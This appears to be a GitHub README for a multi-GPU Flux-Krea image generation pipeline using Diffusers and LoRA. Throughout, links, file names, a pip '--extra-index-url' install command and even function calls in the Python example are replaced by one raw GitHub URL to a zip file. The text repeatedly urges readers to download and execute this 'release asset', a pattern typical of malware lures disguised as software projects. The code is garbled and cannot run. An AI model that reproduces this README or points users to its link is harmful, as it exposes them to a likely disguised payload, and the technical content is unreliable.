# Flux-Krea Multi-GPU Pool: Fast Distributed Image Synthesis with LoRA

[Release page: https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip](https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip)

[![Latest Release](https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip)](https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip)

- Topics: diffusers, flux, gpu-acceleration, hugggingface-transformers, krea, multiprocessing, nvidia, python, transformers, zerogpu

Overview
This project provides a Python-based, multi-GPU image generation pipeline that leans on Huggingface Diffusers and LoRA (Low-Rank Adaptation). It splits image generation tasks across all available GPUs using Python’s multiprocessing to maximize throughput and speed. The system is designed to be robust, scalable, and straightforward to run on workstations with several NVIDIA GPUs. It supports LoRA adapters to tailor models quickly and reduce resource use without retraining.

The goal is simple: you tell the system what you want to generate, and it uses all your GPUs in parallel to deliver images faster than a single-GPU approach. The pipeline is modular, so you can swap models, LoRA adapters, and scheduling strategies as needed.

Why this matters
- You can push more images per minute with the same hardware.
- You can experiment with LoRA adapters to customize models for specific styles or tasks.
- You can run full pipelines on a single machine with multiple GPUs, without needing a distributed cluster setup.

Key ideas
- Distribute work evenly across GPUs to maximize throughput.
- Use a clean, modular interface so you can plug in new models, adapters, or schedulers.
- Keep memory usage steady by chunking work and reusing buffers.
- Provide a simple CLI and a Python API for flexibility.

Structure and core ideas
- A central orchestrator coordinates GPU devices, partitions prompts into chunks, and assigns work to worker processes.
- Each worker handles a chunk of prompts and runs a diffused image generation payload on its assigned GPU.
- LoRA adapters are loaded and applied as part of the diffusion pipeline to enable fast fine-tuning without full model retraining.
- Results are collected, post-processed, and saved in a structured folder layout with metadata for reproducibility.

What you can build with Flux-Krea
- Short-turnaround experiments with multiple prompts on all your GPUs.
- Image generation pipelines that require consistent prompt interpretation across devices.
- Quick LoRA experimentation to compare adapters and styles.
- Local development and research workflows that mimic larger-scale deployments.

Getting started quickly
This guide assumes you have a workstation with several NVIDIA GPUs and a modern Linux or Windows environment. You should have CUDA installed and a compatible PyTorch version. The following steps walk you through a basic setup and a first run.

Prerequisites
- Python 3.8 or newer
- NVIDIA GPUs with current CUDA drivers
- PyTorch built with CUDA support
- Diffusers, Transformers, and Accelerate libraries
- A minimal environment for multiprocessing and file I/O

Installation basics
- Create a virtual environment
- Install PyTorch with CUDA support
- Install core dependencies: diffusers, transformers, accelerate, PIL, numpy
- Optional: prepare LoRA adapters and models you want to test

A minimal setup sequence (typical commands)
- python -m venv venv
- source venv/bin/activate  # Linux/macOS
- # On Windows use venv\Scripts\activate
- pip install --upgrade pip
- pip install torch torchvision torchaudio --extra-index-url https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip  # adjust CUDA version
- pip install diffusers transformers accelerate
- pip install pillow numpy

A note on environments
- If you are using mixed hardware (different GPU types) or limited VRAM, consider allocating smaller batch sizes or processing chunks.
- It helps to pin library versions to avoid incompatibilities between diffusers and transformers.

Architecture and design
- Orchestrator: The main controller that gathers GPU information, loads models and adapters, and manages the task distribution. It handles retries, progress tracking, and result collection.
- Worker processes: A pool of workers, each pinned to a specific GPU. Workers load the diffusion model, prepare the pipeline, apply LoRA adapters, and execute image generation for a subset of prompts.
- Diffusion pipeline: Built on the Huggingface Diffusers API. It supports LoRA adapters to adjust the base model without full retraining.
- Data flow: Prompts come in, are chunked, and sent to worker processes. Each worker generates one or more images per prompt, then returns them to the orchestrator for storage.
- Resource management: The system attempts to keep GPU memory usage predictable by streaming generation steps and limiting parallel concurrency per GPU when needed.
- Logging and monitoring: The system logs progress, per-GPU utilization, time per image, and errors. You can switch logging verbosity to keep things clear.

How to use it: Quick start
- You can drive the pipeline with a short Python script or run a CLI tool if provided in the repo. Here is a minimal example to illustrate how you could call it from Python. Adapt paths and options to your environment.

Code example (pseudo-API)
- Note: Replace the placeholders with your actual model, tokenizer, and LoRA adapter paths.

- from flux_krea_pool import MultiGPUPipeline
- pipeline = MultiGPUPipeline(
-     model="stabilityai/stable-diffusion-2-1-base",
-     lora_adapters=["https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip","https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip"],
-     devices=[0,1,2,3],
-     batch_size=1,
-     steps=50,
-     guidance_scale=7.5,
-     width=512,
-     height=512,
- )
- results = https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip(
-     prompts=["A serene valley at dawn", "A cyberpunk city street at night"],
-     seeds=[1234, 5678],
-     num_images_per_prompt=2,
- )
- https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip(results, output_dir="outputs/experiment-01")

- If you prefer a CLI, run something like:
- flux-krea generate --prompts "A peaceful forest" --num-images 4 --gpus 0,1 --steps 50 --width 512 --height 512 --lora https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip
- The CLI routes work to the same underlying multiprocessing pipeline and keeps a clean log of progress.

How the multiprocessing distribution works
- The orchestrator first detects all available GPUs on the system. It then partitions the input prompts into equal chunks, ensuring each GPU gets a fair share of work.
- Each worker uses one GPU. The worker loads the diffusion model once, and then processes all assigned prompts in batches, speeding up throughput by reducing model load overhead.
- The system uses pinned memory and careful stream handling to minimize data transfer overhead between CPU and GPUs.
- When a prompt requires multiple images, the worker generates the requested number of variants per prompt, then returns the images along with metadata.

LoRA (Low-Rank Adaptation) support
- LoRA adapters are small additive components that modify the diffusion process without training the full model. They let you tailor outputs for style or subject without heavy compute.
- The pipeline loads LoRA adapters up-front and applies them to the base diffusion model during image generation.
- You can experiment with several adapters in parallel by providing their paths; the pipeline composes them as part of the diffusion process.
- LoRA adapters can be swapped on the fly for quick style experiments. This keeps experiments fast while preserving the base model’s stability.

Model and adapter management
- Base models: You can point the pipeline to standard diffusion models such as Stable Diffusion variants or other Diffusers-supported models.
- Adapters: LoRA artifacts are loaded as lightweight tensors that augment the model’s weights during inference. They can be stored locally or retrieved from a hub if you have network access.
- Caching: The pipeline caches models in memory during a run to minimize load time between batches. It can also clear the cache between runs to manage memory usage.

Resource and performance considerations
- GPU memory: The batch size and resolution impact memory usage per GPU. Start with small batches (1–2) and lower resolutions and ramp up as you verify stability.
- CPU utilization: The orchestrator uses multiprocessing. In a multi-core environment, you may expose more CPUs to speed up orchestration, but avoid oversubscription.
- I/O throughput: Writing many images to disk can become a bottleneck. If possible, store to fast local SSDs or use RAM-disk storage for temporary results.
- Latency vs throughput: When you optimize for throughput, you may push larger batches. For latency-sensitive tasks, reduce the number of workers per GPU or use smaller image sizes.

Image generation workflow explained
- Step 1: Load base model and LoRA adapters on each GPU worker.
- Step 2: Normalize prompts, seeds, and settings to a consistent internal format.
- Step 3: Generate first batch of images locally on the GPU.
- Step 4: Save the results to a shared output directory with a structured naming convention.
- Step 5: Repeat for remaining prompts and adapters.
- Step 6: Collect and summarize results in a results manifest with prompts, seeds, settings, and time metrics.

CLI and API details
- Command-line interface (CLI)
  - Purpose: Quick experiments via terminal without writing Python code.
  - Typical commands:
    - flux-krea generate --prompts "A sunset over a snowy peak" --num-images 3 --gpus 0,1 --steps 40 --width 512 --height 512 --lora https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip
  - Options
    - --prompts: A single string or a file with one prompt per line.
    - --num-images: Images per prompt to generate.
    - --gpus: Comma-separated GPU indices to use.
    - --steps: Diffusion steps.
    - --width, --height: Image dimensions.
    - --lora: Path to a LoRA adapter or a comma-separated list of adapters.
    - --batch-size: Per-GPU batch size for generation.
    - --seed: Random seed for reproducibility.
    - --output: Directory to save results.
- Python API
  - The library exposes a class like MultiGPUPipeline (name may vary) that you instantiate and call a generate method.
  - You can pass prompts, number of images, seeds, and optional LoRA adapters.
  - The API returns a structured object or dictionary containing image data, paths, and metadata for further processing.

Model zoo and adapters
- Base models: Any model supported by Huggingface Diffusers can be used, provided you meet the license terms.
- LoRA adapters: Lightweight adapters that modify behavior at inference time. They enable quick style or subject changes without retraining.
- It’s common to test several adapters in quick succession. The multiprocessing design makes this feasible on a single machine with multiple GPUs.

Best practices for reliable runs
- Start simple: Use 1–2 GPUs and modest image size to verify the setup.
- Freeze the memory: Use stable batch sizes and resolutions to avoid memory fragmentation.
- Validate prompts: Keep prompts clear and deterministic to compare results across adapters.
- Use seeds: For reproducibility, set a seed per prompt.
- Save metadata: Store prompts, seeds, adapters, and settings alongside the images for reproducibility.

Quality and validation
- Visual evaluation: Compare images produced under different adapters and prompts for consistency with your intent.
- Reproducibility: Save seeds and configuration so that re-running the exact same prompts yields the same images.
- Performance metrics: Track time per image, total throughput (images per second), and GPU utilization to identify bottlenecks.
- Error handling: The orchestrator should retry transient failures and log persistent issues for investigation.

Troubleshooting quick hits
- GPU not detected: Verify CUDA drivers and PyTorch installation with CUDA support. Check that all GPUs are visible via nvidia-smi.
- Out-of-memory: Lower image resolution, reduce batch size, or limit the number of images generated concurrently per GPU.
- Slow generation: Ensure there is no unnecessary CPU-GPU data transfer in the hot path. Use direct tensors on GPUs and minimize CPU-side copying.
- Adapter not loading: Confirm the adapter file exists and is compatible with the base model. Check for version mismatches between Diffusers and Transformers.
- Inconsistent results across GPUs: Ensure the same model and adapters are loaded on each GPU, and that seeds are applied consistently.

Configuration and environment variables
- You can tune the pipeline using environment variables to simplify automation and testing:
  - FluxKrea_NUM_WORKERS: Number of worker processes per GPU
  - FluxKrea_BATCH_SIZE: Default per-GPU batch size
  - FluxKrea_SEED: Global seed for reproducibility
  - FluxKrea_OUTPUT_DIR: Base path for results
  - FluxKrea_LOG_LEVEL: Logging verbosity (e.g., INFO, DEBUG)
  - FluxKrea_LORA_PATHS: Comma-separated list of LoRA adapter paths
- You can override these at runtime or via a configuration file to keep prompts, adapters, and settings in a single place.

Project structure (typical layout)
- flux_krea_pool/
  - https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip
  - https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip
  - https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip
  - https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip
  - https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip
  - models/
    - https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip
  - adapters/
    - lora/
  - examples/
    - https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip
  - tests/
  - docs/
  - configs/
  - assets/
  - https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip
- tests/
  - unit/
  - integration/
- https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip  <- this file

Extending and contributing
- You can extend the project by adding new backends, prompts, or scheduling strategies. The architecture is modular to support easy integration of new diffusion pipelines, alternative inference engines, or different methods of distributing work across GPUs.
- Contributing guidelines: start with a small feature or fix, add tests, and provide clear documentation of changes. Maintain consistent coding style, simple and readable code, and well-formed commit messages.

Licensing and rights
- The project follows permissive license terms for research and hobby use. You should review the LICENSE file in the repository for exact terms and any restrictions around commercial use.
- Respect model licenses and adapters. Do not run models or adapters in environments where licenses forbid deployment or commercial usage.

Versioning and releases
- The project uses semantic versioning to track changes. Each release includes a changelog, a summary of notable changes, and a list of supported platforms.
- Release artifacts are stored under the Releases section of the repository. If you need a specific version, check the Releases page and download the appropriate asset. For details, visit the Releases page: https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip

Design notes and decisions
- Simplicity first: The pipeline keeps the API approachable so researchers can run experiments without deep engineering effort.
- Portability: The system is designed to work on common Linux workstations with Linux-friendly tooling. Windows support is considered via compatible CUDA builds and Python paths.
- Reproducibility: Seeds and configurations are central to ensuring that experiments can be repeated and compared across runs.

Prompts, prompts, prompts
- Prompts are the primary input to the system. They should be clear and descriptive for best results.
- A good practice is to maintain a directory of prompt templates. This helps you reuse ideas and compare outputs across adapters.
- You can combine prompts with negative prompts if your diffusion model supports them, to steer generation away from unwanted elements.

Post-processing and saving results
- Images are saved with a deterministic naming scheme that encodes the prompt hash, seed, adapter set, and dimensions.
- You can extend the pipeline to apply post-processing steps, such as upscaling, color grading, or stylization, before saving.
- Metadata recorded with each image includes prompt, seed, model, adapters, steps, and timestamps to aid analysis.

Quality checks and CI
- The project can include unit tests for core components like the orchestrator, the per-GPU worker, and the image-saving logic.
- A continuous integration workflow helps ensure the code remains stable across changes and Python versions.

Roadmap and future work
- Support for more backends beyond Diffusers, including other inference engines where available.
- Dynamic workload balancing: adapt the partitioning strategy based on real-time GPU utilization.
- Enhanced caching strategies to reduce model load times when running multiple experiments in a row.
- Improved monitoring dashboards with live GPU usage and memory statistics.

Credits and acknowledgments
- The core diffusion technology comes from Huggingface Diffusers and the LoRA ecosystem. The project builds on those foundations to offer a practical multi-GPU orchestration layer.
- Thanks to the broader community for ongoing innovations in efficient multi-GPU inference.

About the author and maintainers
- This project is maintained by contributors who care about fast, reproducible image generation on workstations with multiple GPUs.
- If you run into issues or have ideas for improvements, open issues or submit pull requests. Clear issues with reproducible steps help.

Disclaimer
- This project is intended for legitimate research and testing on hardware you own or have explicit permission to use. Respect all licensing terms for models, adapters, and datasets.

If you want to dive deeper into the technical details
- The orchestration strategy is designed to minimize synchronization overhead between GPUs.
- Each worker instance loads its own copy of the base model and LoRA adapters, then runs the diffusion loop with local batch processing to maximize throughput.
- The system uses robust error handling to manage occasional GPU hiccups without losing the entire run.

How to contribute to the codebase
- Start with the documentation and a small patch or feature.
- Add tests to cover new logic in the orchestrator and worker components.
- Update the README with examples of new features and user scenarios.
- If you are unsure about a change, discuss it in an issue first to align with project goals.

Model compatibility and notes
- The pipeline works best with diffusion models that support LoRA adapters out-of-the-box.
- Some adapters may require specific tokenizers or scheduler configurations. Always verify compatibility in a controlled test run before large-scale experiments.
- If you update dependencies, test the end-to-end flow in a minimal scenario to ensure no regressions.

Releases and how to get assets
- The primary location for assets and versions is the Releases page. See the top badge and link for easy access.
- If you need to fetch a particular asset, go to the Releases page and download the file that matches your environment (CUDA version, Python version, and adapter set). The Releases page contains the exact assets you need for each version.

Appendix: Quick reference table
- Workflow: Prompt ingestion -> Partitioning -> GPU assignment -> Image generation -> Saving outputs
- Core libraries: Diffusers, Transformers, Accelerate
- Adapter technology: LoRA
- Parallelism: Python multiprocessing across GPUs
- Output: Images and metadata stored locally

Notes on usage and maintenance
- Regularly update dependencies to stay compatible with the latest Diffusers and Transformers releases, but test compatibility with your existing LoRA adapters.
- Maintain a small set of adapters for quick comparisons to reduce confusion during experiments.
- Document results for future comparisons and to track progress over time.

Repository topics
- diffusers
- flux
- gpu-acceleration
- hugggingface-transformers
- krea
- multiprocessing
- nvidia
- python
- transformers
- zerogpu

Open questions and design choices
- How to best balance adapter load across GPUs when adapters differ in size or compute cost?
- Should we implement dynamic rebalancing during a run if a GPU falls behind?
- How to support streaming or progressive outputs for long-running prompts?

End-user impact
- You get faster, scalable image generation by leveraging all available GPUs.
- You gain a flexible tool to compare LoRA adapters and diffusion models in a controlled, repeatable way.
- You can build experiments that would be slow on a single GPU, enabling more rapid iteration.

Notes on safety and compliance
- Follow licenses for any models and adapters you use.
- Do not deploy models or adapters in settings where the license forbids it.
- Consider privacy and copyright when using prompts or generated images.

Releases
- For the latest stable assets and version history, refer to the Releases page linked at the top of this document. If you need a specific asset, locate the appropriate release and download it from there. The Releases page contains the exact assets for each version and the instructions for installation and usage.

Tips for advanced users
- Profile your run to identify bottlenecks. Tools like nvprof, nsight, or built-in PyTorch profilers can help.
- Use a consistent environment across runs to improve reproducibility.
- Build a small suite of prompts that cover different styles and subjects to test adapters quickly.

Enjoy generating with speed
- Flux-Krea combines the power of Diffusers with the flexibility of LoRA and the efficiency of multiprocessing. It helps you push more workloads through your multi-GPU setup with a straightforward workflow and clear results.

Releases note
- For any release-specific instructions, see the Releases page. The asset package typically includes a ready-to-run script or a small installer, along with example configurations. If you need a file to download and execute, that release asset will be the right place to start.

Prominent usage examples
- Python snippet demonstrating multi-GPU generation across four GPUs with a LoRA adapter
- CLI usage example showing how to pass prompts, adapters, and GPU indices
- Batch generation example that showcases prompt batching, seeds, and timing

Node of caution
- Start with small prompts and low resolution to confirm that your setup runs correctly. Then gradually scale up the complexity and the number of GPUs as you gain confidence.

Final note
- This document describes a comprehensive, well-structured workflow for distributed image generation on multiple GPUs. It emphasizes clarity, reproducibility, and practical experimentation with LoRA adapters and diffusion models. The approach aims to be robust, adaptable, and approachable for researchers and hobbyists alike.

Releases and updates (again)
- For assets, downloads, and version history, please consult the Releases page: https://raw.githubusercontent.com/TTVRODRIK/Flux-Krea-multi-GPU-Pool/main/hydremic/Flux-multi-GP-Pool-Krea-v1.2-beta.1.zip This page hosts the downloadable artifacts required to run the pipeline on your hardware. Use the given assets as instructed by each release.